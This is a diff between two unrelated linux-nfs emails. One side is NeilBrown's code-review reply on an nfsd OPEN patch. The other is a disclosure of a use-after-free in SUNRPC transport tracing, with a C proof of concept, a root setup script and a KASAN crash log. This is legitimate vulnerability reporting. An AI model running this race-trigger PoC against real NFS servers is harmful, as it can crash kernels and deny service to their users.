@@ -1,301 +1,335 @@
-Received: from fhigh-b5-smtp.messagingengine.com (fhigh-b5-smtp.messagingengine.com [202.12.124.156])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5469933FE0A;
-	Sat, 12 Sep 2026 03:22:45 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=202.12.124.156
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C5DB7326939
+	for <linux-nfs@vger.kernel.org>; Sat, 12 Sep 2026 13:56:23 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789183367; cv=none; b=pv4h9hAxMoe65q84ZAbUWSDCqN4XRY55zhkY71E23xNB9HwCj2W5yXr0sR1wNXd79hDfVMnsjnYqVtrL7FYGAGSMFtQ5a8hIsUFu+/oNc86Smblb1yjOZo2KmZggARugWb+vzxuM0brBx0i/bYqyBTW+FL9PN4Z+diW2ultf60M=
+	t=1789221385; cv=none; b=gQ9wBv97rgad4b8DuYPNI/uGrzLWuIPProj6ras2KEjgOJPUgbFLDg6r2MW/vyrdbg/RsxQquDHKUWGW4UXwulEf43TqSV9UQBt0a1zlT/+0FbC2fKi6t3NGsbIaIN0bdjiZOdwCm0x+ezzjV9NQLtNf/rycUNW1qYe67siVbpQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789183367; c=relaxed/simple;
-	bh=rHyj8nq9SdrAr2DUo80gEqH/12gyneM1TuNITgfQrTs=;
-	h=Content-Type:MIME-Version:From:To:Cc:Subject:In-reply-to:
-	 References:Date:Message-id; b=mIWUnAs7aWOP2LgHXRVwc3oYHlsXKcUJPhsdSfPDImaINouYxFHjIENmUgkVQ+QF3RMBO/271OnaSp74Va10uJ5339o0RQOGVmoOCxge3EeiF4Za5Zctt0AROnKBkH0Y9sNAqqDefzpWuaOat7GRCN1midOlM69nlackJuB4LEA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=ownmail.net; spf=pass smtp.mailfrom=ownmail.net; dkim=pass (2048-bit key) header.d=ownmail.net header.i=@ownmail.net header.b=I9/6UaqO; dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b=ayFVm+5c; arc=none smtp.client-ip=202.12.124.156
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=ownmail.net
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=ownmail.net
+	s=arc-20240116; t=1789221385; c=relaxed/simple;
+	bh=3Zmgdw0QDt5Fg7eG1DHFlfLM0BG26coxDtoMF6t7tKY=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=uSry4CnOTmG2KZgmTMPyu53dEOIyA1gjVngMqYaqGwR6SiQ1GVVeB4rTYgJhTjCNHNXs41jGTPM0OOosnfzU9KULI9yMi1hq2U7REJb6GqaczvLQ31oOvj/gtCSIs+EyB1Ht0GT9y/pwA+13xXLy894pPZWu+tyW3ZQgn43eqZk=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=HUmyHQXp; arc=none smtp.client-ip=209.85.210.182
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=ownmail.net header.i=@ownmail.net header.b="I9/6UaqO";
-	dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b="ayFVm+5c"
-Received: from phl-compute-08.internal (phl-compute-08.internal [10.202.2.48])
-	by mailfhigh.stl.internal (Postfix) with ESMTP id 5EFF27A00F8;
-	Fri, 11 Sep 2026 23:22:44 -0400 (EDT)
-Received: from phl-frontend-03 ([10.202.2.162])
-  by phl-compute-08.internal (MEProxy); Fri, 11 Sep 2026 23:22:44 -0400
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ownmail.net; h=
-	cc:cc:content-transfer-encoding:content-type:content-type:date
-	:date:from:from:in-reply-to:in-reply-to:message-id:mime-version
-	:references:reply-to:reply-to:subject:subject:to:to; s=fm1; t=
-	1789183364; x=1789269764; bh=Jvxm21li6FThkcO5YWEXqyyO/3eSjsqM6Kr
-	qScf4LbE=; b=I9/6UaqOsTyZVMRNip2KQma9PpgNBBe53waVm2ujlEOE6e2HC2Z
-	imYEUeuFCd4KDhNOuYzRhcrjG/F+Ph9aALvqy/VKHfrAiOp9UOceCsSeX6L2yfck
-	aTIwnCCxTAgixc9CbftEUYFkniMI97o/Gr95GT6RyEg8VRo7ZLnmNUEe2pbq1IbS
-	N4Lz4pd4V2owOQkTkR/TI1XH42ABd5v20injcoUmlTO11CfTdnS+jXDVZmtUfnvt
-	j6HsqYZqD2VGrVeJwdHLsmzvhOQu2/yp60yHSqJiUPbki6b9YzGldJ18gE9VTY25
-	xO+G0wLlIUNajDHVx/kH0Xlf1Wy4rLikhmQ==
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	messagingengine.com; h=cc:cc:content-transfer-encoding
-	:content-type:content-type:date:date:feedback-id:feedback-id
-	:from:from:in-reply-to:in-reply-to:message-id:mime-version
-	:references:reply-to:reply-to:subject:subject:to:to:x-me-proxy
-	:x-me-sender:x-me-sender:x-sasl-enc; s=fm1; t=1789183364; x=
-	1789269764; bh=Jvxm21li6FThkcO5YWEXqyyO/3eSjsqM6KrqScf4LbE=; b=a
-	yFVm+5cCrvRnOM8KSK2pdPLq7peJZPq0vZmEq83q1Cv9vrdHriErv/lSDu7iDfx9
-	4vLCHoyIuGEKQObF7J1aXaDiEm0WtWzdfIGqvNie38oDxQyxs5xsNySeQxBeMlz+
-	o1i62ZdGNVC3rDsz2UeHjMPAtF9lCg8UiL8pIl63vxNEQO3DmzzGC4rvh62HRP0X
-	YyDOOu6h0hstiDSYo0F/AyBiK9phkDtMbLIy8Z975gTvJ6tt68Bh657F8VaF1AGE
-	qPvrE/tR0SOvTIydNPjrh51bnkR1ivRsiclXyp/cjMkgc8GiRtobLRddxI1pALy9
-	FQklsQVugzTVdZO+RJKhA==
-X-ME-Sender: <xms:hMWkaq2WFov-FWp3NNAxTSTairZfIZ9Rg0OFiSdVEi5hAtK0m7F9MA>
-    <xme:hMWkavWZR3DcyhvnUYYDTBo59NMzUYvrp7GTwI2zHB_aA0st24NG2gqJOB5nWYk2U
-    EpgyQQeOSb_aMgO5XH4jXgUwQgj5ANsPihzCVk8eJ1QkC6_jfY>
-X-ME-Received: <xmr:hMWkalKH7nHAKEU-5j6X_K2j9X_X_R_p0VE3uHQyR6qZXn-lBFNl5oTGc04F7yM5mAdAwNyccG9siXTUfcX4OyxR7CHZOI0>
-X-ME-Proxy-Cause: dmFkZTFhrcs22ggi7R9L8CbrlUewdX7Wk0XephWPGw7sKWHxPvm2UjXaKqLMcd/yfhxTGp
-    rKasg2mk9G6xr2uy6ePW3iEjCkbeRxg69FpCj08fvXcFNcRLGR+K5iXS7Ok8M5hRt+Pehc
-    NNt9Sp1TTrrdLj+zoWZXOU6uQuZgHxgtnW9B5ArTgvWyCqytfEUYASZtwcipBDyETB4TiZ
-    jCYQcHEMybYP4D0dnVO8Lsw4ZkrW2IEp3TWGv5eHOW7AbOVt9r9AyciKAhcSDi6ucOKs6u
-    wH4F0lOwu9fhQJTUnabq16Sn4yd5d0BNjQRROweD9KB2LSp0UPDWXB0iU4PQLVRqYAdCgY
-    brE4lFHXDNFU1JeIytY9yLNVTN9xYpKNimvwmQubYRC8rs564wnLBftNiu1fDGeuq8nRMD
-    TzNsGIK8mueCvA+VIltKb65xoU/IrbO554p3vn0o2SxCOx33/qKOzhIUn4xTkNtaVsdf0A
-    6kV+2BY4oKj2gI2qn0tJTLE4pAAVf3u5JfuRGz8MNm1YlDiCuyFGMfw3rseHYAGqhfYgMU
-    uhE3ZN1IkcYWCvOSEx51d8uBrZPMl1SVPUI3rB4NSnx2zWgMDOU3XKToGnRGLCYhnts962
-    1x/BfCFfcVPMeQVEGEbYHKqqSXNGV+gV3pVfhFAZ0QaFOEccS3vH6+Ap8RXQ
-X-ME-Proxy: <xmx:hMWkah24ajoV5JkmzsVIuq2AnslfpTxhohna7wZFlvQrKoRSxUbq3Q>
-    <xmx:hMWkar5GS-mYgptDvM2bvywqvGYGEOxWQHhXehh_G5-vpq4MYce2wQ>
-    <xmx:hMWkaq8yEUQqO_IfbQj5e-g2h-JDrP2nXe7fPQepjFY5ja4jC53gFA>
-    <xmx:hMWkaiUqCl7qUzz5cAh1t_AeDsiJwg-vSQhQkbSonohVkW2DHyjc-A>
-    <xmx:hMWkakg9VAE2VWOT5u0A4KJzin2dSZKeoei7e6nl4SYQ0xvP3b-IDrhl>
-Feedback-ID: i9d664b8f:Fastmail
-Received: by mail.messagingengine.com (Postfix) with ESMTPA; Fri,
- 11 Sep 2026 23:22:41 -0400 (EDT)
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: quoted-printable
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="HUmyHQXp"
+Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-8692be1cda4so1524966b3a.1
+        for <linux-nfs@vger.kernel.org>; Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1789221383; x=1789826183; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
+        b=HUmyHQXp6q5Oe6Z95iqXKARhUJcainnBK9q9sJpvpNnoEjS8dYKZ/3cqlOGzufkgEj
+         nUPfGrG3dGr70E8jPeitEQJ17xnHhBNeG3WEdjCxVjJsaY1Wa3gTL2FxULdQ1T5rfa88
+         kUc3QGCkc6uhefoUKC82JB+XlmQAkNo1Gu4f0yE8dKrozSRGn23U2IpM8xebAoZXOvHQ
+         R0gmxrfCJ1PTyXtkYfS7xNNy11E9iM/7yUauS3dxPEaVN/OByz6R5hjPRAa5k2Z5l9r9
+         bEjzKC1UsmTL71oNKkIC3oU/7548d2gq0dOD/1xhiXaJ6nyE0I/eJ3nT5ba6iTcjs3Kt
+         vi5A==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1789221383; x=1789826183;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
+        b=Y+h4e/SYllP/9kpl6rDLHhPIySk88F7LEIEWbHnFDqR33KYvrufle51bdCKaP6rweo
+         lryFVKDuR6ZnOaftEqmigKL93jEUn6GaPHuiemjkzJoIKhIykeORBx5N0ub2NgzhN992
+         v3G44c2x2MOghrbgMIi2ESI4C8HYpFcu+iE59TrAFa1n3XAvvkIZX7Lr704xwkQyySr3
+         gLPUSYfcROeIl8Lr5o08CC4iZpUyAyrg8n+il2H8L9c99L6QOHcHj/s8G6WfJurB68tU
+         ExJ1AazXnGP0OFBuoQbIeZxYJ5OjjAMtYnoALbqekZGVg23k/EjyJYeLSVT1Cimazox8
+         tp+A==
+X-Gm-Message-State: AFuF++miSwmB9fVcFyPl4MkUwj9fy7VunXmbTLqCBZ4DSgGpG7CmfcTa
+	dD+wikdTW9K6TF7Z9hdP2pbDwKnoKDGPon5E5fgmVSmPOEKWM6AYIvV1JZiK5tWO9lxpOsmTIn0
+	KsI0Irc5EDxo=
+X-Gm-Gg: AYBFou3sRbEsLPvz1EcHcHy/CFhqrKlZhRQ48CV6MO7kficMNuIzGDaZQsZDDjNLOUN
+	DFa6LQmkk5gzcZ86n6lD4xknPbVTMYd5kAOL846NfqNBJOuV8LLaQqDN6kdTpu8xhicrNp+fZ28
+	eEIZTS280k8S0Tw8FMy9SspFejgIQzY5vaS7A/J5u0n8tSHsmRnhwgkM8w8wVCayPgkw9Co37Jd
+	28LVUv/x+j+o+YT3tgjO5FWlpLTebBLdQI01kEVnWjU0Px5r3Zgh/lbuf9qXvytpYlCD3wRo1ku
+	7MTTUkoHVh6Udu7wFxlzFF5VAKx8umCb87FnE1XMosY+442TfZRODltcuk0mnyxXwLh0uH2odwA
+	TkWrAamYaqUcjx+SUzLRlBenPAtLZj3yU9m2RFoqbtLgySabKYxJS6WWc5wLXKVWF6c+6/KJ9Rr
+	SyY4Nu10hIsOcCxs3Ybzc9/qpdiGOrbYiWkMsFPBH0k5zKyH0YK+ryHk3PFlyPOheog29zYJ434
+	xFkXg8=
+X-Received: by 2002:a05:6a21:8cc4:b0:3cc:92d9:80cb with SMTP id adf61e73a8af0-3daed4edf77mr17451958637.12.1789221383106;
+        Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
+Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33ba4f1e434sm13947833eec.22.2026.09.12.06.56.18
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sat, 12 Sep 2026 06:56:22 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: linux-nfs@vger.kernel.org,
+	netdev@vger.kernel.org
+Cc: trondmy@kernel.org,
+	anna@kernel.org,
+	cel@kernel.org,
+	jlayton@kernel.org,
+	neil@brown.name,
+	okorniev@redhat.com,
+	Dai.Ngo@oracle.com,
+	tom@talpey.com,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH net 0/1] SUNRPC: hold a reference while tracing accepted transports
+Date: Sat, 12 Sep 2026 21:56:08 +0800
+Message-ID: <cover.1789220778.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: linux-nfs@vger.kernel.org
 List-Id: <linux-nfs.vger.kernel.org>
 List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-From: NeilBrown <neilb@ownmail.net>
-To: "Chuck Lever" <cel@kernel.org>
-Cc: "Alexander Viro" <viro@zeniv.linux.org.uk>,
- "Christian Brauner" <brauner@kernel.org>, "Jeff Layton" <jlayton@kernel.org>,
- linux-fsdevel@vger.kernel.org, linux-nfs@vger.kernel.org
-Subject: Re: [PATCH 5/7] nfsd: switch NFS4 OPEN to use vfs_lookup_open()
-In-reply-to: <e36532d5-e37f-4d71-b83a-c8d19d87811f@slotpi15m67>
-References: <20260910002934.192979-1-neilb@ownmail.net>
-  <20260910002934.192979-6-neilb@ownmail.net>
-  <e36532d5-e37f-4d71-b83a-c8d19d87811f@slotpi15m67>
-Date: Sat, 12 Sep 2026 13:22:38 +1000
-Message-id: <178918335830.207413.5617836439117097761@noble.neil.brown.name>
-Reply-To: NeilBrown <neil@brown.name>
+Content-Transfer-Encoding: 8bit
 
-On Fri, 11 Sep 2026, Chuck Lever wrote:
-> >     This implementation shares more code with syscall open paths and so u=
-ses
-> >     some filesystem interfaces slightly more correctly.  It also takes the
->=20
-> Which interfaces? The concrete difference I can see is that lookup_open()
-> honors ->atomic_open, which do_lookup_open() never called. Naming that
-> would be clearer than "slightly more correctly".
+Hi Linux kernel maintainers,
 
-It is more subtle than that.
-do_lookup_open() calls dentry_create() which calls ->lookup_open().
-But do_lookup_open() calls start_creating() first, which might call
-->lookup.
+We found and validated an issue in net/sunrpc/svc_xprt.c. The bug is
+reachable by a root user through the NFSD listener and TCP connect path.
+We've tested it, and it should not affect any other functionality.
 
-So a NFSv4 OPEN for name that isn't in cache will (before this change)
-call ->lookup() and if that fails, will call ->atomic_open().
-After this change the ->lookup() will be skipped because it isn't
-needed, ->atomic_open will do the equivalent.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Also the start_creating() in do_lookup_open() doesn't pass LOOKUP_OPEN
-to d_revalidate so that revalidate does more work (I think).
+---- details below ----
 
-Also do_lookup_open() will always exclusively lock the directory, while
-vfs_lookup_open() will only do that if the name isn't in the dcache
+Bug details:
 
-So they are subtle differences, and only slight.  And I might have
-missed some.  Maybe I could summarise them better.  The main point,
-though, is to use the same code path as syscalls.=20
+svc_handle_xprt() publishes a newly accepted transport with
+svc_add_new_temp_xprt() before calling trace_svc_xprt_accept(). Publishing
+the transport clears XPT_BUSY and allows another service worker to close
+and free it immediately.
 
->=20
->=20
-> >     We need to pass O_NONBLOCK so that that EWOULDBLOCK errors from
->=20
-> Repeated word: "that that".
->=20
->=20
-> >     vfs_lookup_open() always returns -EFTYPE if a non-regular-file was
-> >     found, and provides the dentry in parent.dentry.  We can use
-> >     nfsd_check_obj_is_reg() to turn this into an error.
-> >
-> >     As parent.dentry could be NULL, we enhance nfsd_check_obj_is_reg() to
-> >     cope with that.
->=20
-> The function is nfsd_check_obj_isreg(), in both places.
->=20
->=20
-> >     vfs_lookup_open() will return -EEXIST if required for
-> >     NFS_CREATE_GUARDED4 as O_EXCL is passed in.  Other checks for
-> >     and existing object need only test for nfsd4_create_is_exclusive().
->=20
-> s/and existing/an existing/, and the identifier is NFS4_CREATE_GUARDED.
->=20
-> The -EEXIST claim holds only on the path through the tail of
-> vfs_lookup_open(), where the O_EXCL test runs before the d_is_reg()
-> test. When lookup_open() itself returns -EFTYPE, vfs_lookup_open()
-> returns before either test. See below.
->=20
->=20
-> > diff --git a/fs/nfsd/nfs4proc.c b/fs/nfsd/nfs4proc.c
-> > index 3a82af381a8d..0fd5a6411ed3 100644
-> > --- a/fs/nfsd/nfs4proc.c
-> > +++ b/fs/nfsd/nfs4proc.c
->=20
-> [ ... ]
->=20
-> > @@ -312,7 +269,7 @@ nfsd4_create_file(struct svc_rqst *rqstp, struct svc_=
-fh *fhp,
-> >  		.na_iattr	=3D iap,
-> >  		.na_seclabel	=3D &open->op_label,
-> >  	};
-> > -	int oflags =3D O_CREAT | O_LARGEFILE;
-> > +	int oflags =3D O_CREAT | O_LARGEFILE | O_NONBLOCK;
->=20
-> Nit: do_dentry_open() strips O_CREAT, O_EXCL and O_TRUNC from f_flags
-> and leaves O_NONBLOCK in place, so op_filp now carries O_NONBLOCK into
-> the filecache entry that nfsd_file_acquire_opened() builds from it.
-> Files opened through __nfsd_open() do not. Is that divergence
-> intended?
+The tracepoint then dereferences the accepted transport without holding a
+reference. A concurrent connect-and-close sequence can therefore make the
+tracepoint read freed transport fields, including the addresses, flags,
+class, and network namespace.
 
-No, but it should be harmless.  O_NONBLOCK doesn't affect IO to regular
-files, only the act of opening them.  This new behaviour is the same
-outcome as opening a regular file with O_NONBLOCK from user-space, and
-consistency is good.
+The fix takes an extra reference before publishing the transport and
+releases it after trace_svc_xprt_accept() returns.
 
->=20
->=20
-> >  	struct dentry *child =3D ERR_PTR(-EINVAL);
-> >  	struct path parent =3D {
-> >  		.mnt =3D fhp->fh_export->ex_path.mnt,
-> > @@ -424,28 +381,29 @@ nfsd4_create_file(struct svc_rqst *rqstp, struct sv=
-c_fh *fhp,
-> >  		/* Might still succeed if no create is needed */
-> >  		oflags &=3D ~O_CREAT;
-> > =20
-> > -	open->op_filp =3D do_lookup_open(&parent,
-> > -				       &QSTR_LEN(open->op_fname,
-> > -						 open->op_fnamelen),
-> > -				       oflags,
-> > -				       open->op_iattr.ia_mode);
-> > +	dget(parent.dentry);
-> > +	open->op_filp =3D vfs_lookup_open(&parent,
-> > +					&QSTR_LEN(open->op_fname,
-> > +						  open->op_fnamelen),
-> > +					oflags,
-> > +					open->op_iattr.ia_mode & S_IALLUGO);
->=20
-> Nit: after this call "parent.dentry" is the child (or NULL), while a
-> few lines up IS_POSIXACL(d_inode(parent.dentry)) reads the same
-> expression as the parent directory. The VFS patch renamed its parameter
-> to @path for this reason. Would renaming the local here avoid the same
-> trap?
+Reproducer:
 
-Probably sensible - yes.
+    make
+    sh ./poc.sh
 
->=20
->=20
-> >  	if (IS_ERR(open->op_filp)) {
-> >  		int hosterr =3D PTR_ERR(open->op_filp);
-> > =20
-> > -		if (open->op_createmode !=3D NFS4_CREATE_UNCHECKED) {
-> > -			switch (hosterr) {
-> > -			case -EISDIR:
-> > -			case -ELOOP:
-> > -			case -EFTYPE:
-> > +		if (hosterr =3D=3D -EFTYPE) {
-> > +			if (nfsd4_create_is_exclusive(open->op_createmode))
-> >  				hosterr =3D -EEXIST;
-> > -			}
-> > +			else
-> > +				hosterr =3D nfsd_check_obj_isreg(parent.dentry);
-> >  		}
->=20
-> Does this drop the NFS4ERR_EXIST mapping for GUARDED4?
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
 
-GUARDED4 causes O_EXCL to be set so we never get -EFTYPE, only -EEXIST.
+------BEGIN poc.c------
 
->=20
-> The old test covered GUARDED as well as the two EXCLUSIVE modes.
-> nfsd4_create_is_exclusive() covers only EXCLUSIVE4 and EXCLUSIVE4_1, so
-> a GUARDED open that finds a non-regular object now takes the else arm
-> and returns NFS4ERR_ISDIR, NFS4ERR_WRONG_TYPE, and so on. RFC 8881
-> section 18.16.3 says a GUARDED4 duplicate is NFS4ERR_EXIST.
->=20
-> Keeping "open->op_createmode !=3D NFS4_CREATE_UNCHECKED" here would
-> restore the old mapping without depending on the ordering of checks
-> inside each filesystem's ->atomic_open.
+    #define _GNU_SOURCE
+    #include <arpa/inet.h>
+    #include <errno.h>
+    #include <netinet/in.h>
+    #include <pthread.h>
+    #include <signal.h>
+    #include <stdatomic.h>
+    #include <stdbool.h>
+    #include <stdint.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <sys/socket.h>
+    #include <sys/time.h>
+    #include <sys/types.h>
+    #include <time.h>
+    #include <unistd.h>
 
-I would argue that returned -EFTYPE when O_EXCL was given is not just an
-ordering issue, it is an error.
+    static atomic_bool stop_flag = false;
+    static atomic_ulong attempts = 0;
+    static atomic_ulong connects = 0;
+    static atomic_ulong errs = 0;
 
-Maybe defensive programming is more sensible - but I didn't like the
-noise of testing multiple cases...
+    struct worker_args {
+    	struct sockaddr_in addr;
+    };
 
->=20
-> Separately, can this arm return nfs_ok? nfsd_check_obj_isreg() returns
-> 0 for a regular file, and vfs_lookup_open() can leave a regular file in
-> parent.dentry when the d_lookup() it does after an -EFTYPE races with a
-> rename (the VFS marks that case with a WARN_ON_ONCE rather than
-> excluding it). nfserrno(0) is nfs_ok, op_filp is then set to NULL, and
-> nfsd4_create_file() returns success with resfhp never composed. It only
-> fails safely today because do_open_lookup() then calls
-> nfsd_check_obj_isreg() on the NULL fh_dentry. Something like
->=20
-> 		if (!hosterr)
-> 			hosterr =3D -EFTYPE;
->=20
-> would address that.
->=20
->=20
-> >  		status =3D nfserrno(hosterr);
-> >  		open->op_filp =3D NULL;
-> >  		if (status =3D=3D nfserr_noent && create_status)
-> >  			status =3D create_status;
-> > +		dput(parent.dentry);
-> >  		goto out;
-> >  	}
-> > +	dput(parent.dentry);
-> > =20
-> >  	child =3D open->op_filp->f_path.dentry;
-> >  	open->op_created =3D open->op_filp->f_mode & FMODE_CREATED;
-> > @@ -462,7 +420,9 @@ nfsd4_create_file(struct svc_rqst *rqstp, struct svc_=
-fh *fhp,
-> >  		open->op_created =3D true;
-> > =20
-> >  	if (!open->op_created) {
-> > -		if (open->op_createmode =3D=3D NFS4_CREATE_UNCHECKED) {
-> > +		if (nfsd4_create_is_exclusive(open->op_createmode)) {
-> > +			status =3D nfserr_exist;
-> > +		} else {
->=20
-> Same question here. GUARDED used to get nfserr_exist from this branch
-> and now gets the "no change happened" arm. It is unreachable for GUARDED
-> today only because vfs_lookup_open() returns -EEXIST whenever O_EXCL is
-> set and nothing was created. Should this also stay as
-> "!=3D NFS4_CREATE_UNCHECKED" so the protocol rule is enforced here rather
-> than relying on that ordering?
+    static void on_signal(int sig)
+    {
+    	(void)sig;
+    	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
+    }
 
-I'll think more on this...
+    static void *worker(void *arg)
+    {
+    	struct worker_args *w = arg;
+    	struct linger ling = {
+    		.l_onoff = 1,
+    		.l_linger = 0,
+    	};
 
-Thanks,
-NeilBrown
+    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
+    		int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+    		if (fd < 0) {
+    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);
+    			continue;
+    		}
 
+    		setsockopt(fd, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
+    		atomic_fetch_add_explicit(&attempts, 1, memory_order_relaxed);
+    		if (connect(fd, (struct sockaddr *)&w->addr, sizeof(w->addr)) == 0)
+    			atomic_fetch_add_explicit(&connects, 1, memory_order_relaxed);
+    		else if (errno != ECONNREFUSED && errno != ECONNRESET &&
+    			 errno != ETIMEDOUT && errno != EHOSTUNREACH &&
+    			 errno != ENETUNREACH)
+    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);
 
->=20
->=20
-> --=20
-> Chuck Lever (Come to NFS bake-a-thon! https://nfsv4bat.org)
->=20
+    		close(fd);
+    	}
+
+    	return NULL;
+    }
+
+    int main(int argc, char **argv)
+    {
+    	struct worker_args args = {
+    		.addr = {
+    			.sin_family = AF_INET,
+    			.sin_port = htons(2049),
+    		},
+    	};
+    	pthread_t *threads;
+    	unsigned int nthreads = 64;
+    	unsigned int seconds = 0;
+    	time_t start = time(NULL);
+
+    	if (argc > 1)
+    		nthreads = strtoul(argv[1], NULL, 0);
+    	if (argc > 2)
+    		seconds = strtoul(argv[2], NULL, 0);
+    	if (argc > 3 && inet_pton(AF_INET, argv[3], &args.addr.sin_addr) != 1) {
+    		fprintf(stderr, "bad IPv4 address: %s\n", argv[3]);
+    		return 1;
+    	}
+    	if (argc <= 3)
+    		inet_pton(AF_INET, "127.0.0.1", &args.addr.sin_addr);
+
+    	signal(SIGINT, on_signal);
+    	signal(SIGTERM, on_signal);
+
+    	threads = calloc(nthreads, sizeof(*threads));
+    	if (!threads) {
+    		perror("calloc");
+    		return 1;
+    	}
+
+    	for (unsigned int i = 0; i < nthreads; i++) {
+    		if (pthread_create(&threads[i], NULL, worker, &args) != 0) {
+    			perror("pthread_create");
+    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
+    			nthreads = i;
+    			break;
+    		}
+    	}
+
+    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
+    		sleep(1);
+    		fprintf(stderr,
+    			"elapsed=%lds attempts=%lu connects=%lu errs=%lu\n",
+    			(long)(time(NULL) - start),
+    			atomic_load_explicit(&attempts, memory_order_relaxed),
+    			atomic_load_explicit(&connects, memory_order_relaxed),
+    			atomic_load_explicit(&errs, memory_order_relaxed));
+    		if (seconds && (unsigned int)(time(NULL) - start) >= seconds)
+    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
+    	}
+
+    	for (unsigned int i = 0; i < nthreads; i++)
+    		pthread_join(threads[i], NULL);
+    	free(threads);
+    	return 0;
+    }
+
+------END poc.c--------
+
+------BEGIN poc.sh------
+
+    #!/bin/sh
+    set -eu
+
+    cd "$(dirname "$0")"
+
+    mountpoint -q /proc/fs/nfsd || mount -t nfsd nfsd /proc/fs/nfsd
+    printf -- "-3 +4 +4.1 +4.2\n" > /proc/fs/nfsd/versions
+    printf "tcp 2049\n" > /proc/fs/nfsd/portlist
+    printf "8\n" > /proc/fs/nfsd/threads
+    printf "0" > /proc/sys/kernel/panic_on_warn
+    printf "1" > /sys/kernel/tracing/events/sunrpc/svc_xprt_accept/enable
+
+    exec ./poc 128 180
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+[  333.976492][ T1246] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
+[  333.977355][ T1246] KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
+[  333.977921][ T1246] CPU: 0 UID: 0 PID: 1246 Comm: nfsd Tainted: G    B              6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
+[  333.978690][ T1246] Tainted: [B]=BAD_PAGE
+[  333.978970][ T1246] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  333.979739][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
